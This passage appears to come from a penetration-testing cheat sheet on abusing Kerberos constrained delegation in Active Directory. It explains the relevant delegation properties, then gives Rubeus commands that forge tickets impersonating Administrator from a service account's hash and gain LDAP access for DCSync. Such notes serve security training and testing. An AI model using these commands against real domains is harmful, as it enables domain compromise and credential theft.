Constrained delegation can be set on the _frontend server_ (e.g. IIS) to allow it to delegate to _only selected backend services_ (e.g. MSSQL) on behalf of the user.

DACL UAC property: `TrustedToAuthForDelegation`. This allows `s4u2self`, i.e. requesting a TGS on behalf of _anyone_ to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn’t used between the user and frontend.

DACL Property: `msDS-AllowedToDelegateTo`. This property contains the SPNs it is allowed to use `s4u2proxy` on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using `s4u2self`). This effectively defines the backend services that constrained delegation is allowed for.

**NOTE:** These properties do NOT have to exist together! If `s4u2proxy` is allowed without `s4u2self`, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.

#### Exploitation

In this case, we use Rubeus to automatically request a TGT and then a TGS with the `ldap` SPN to allow us to DCSync using a machine account.

```powershell
# Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E

# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt

# Same as the two above steps, but access the LDAP service on the DC instead (for dcsync)
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```